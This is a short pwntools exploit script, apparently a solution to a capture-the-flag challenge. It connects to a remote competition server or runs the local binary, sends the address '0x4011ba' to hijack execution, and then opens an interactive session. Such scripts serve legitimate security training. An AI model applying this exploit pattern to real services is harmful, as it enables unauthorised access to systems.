from pwn import *

gs = '''
b *main+57
continue
'''

elf = context.binary = ELF("./chall")

def start():
    if args.REMOTE:
        return remote("kashictf.iitbhucybersec.in", 38975)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.recv()

io.sendline("0x4011ba")

io.interactive()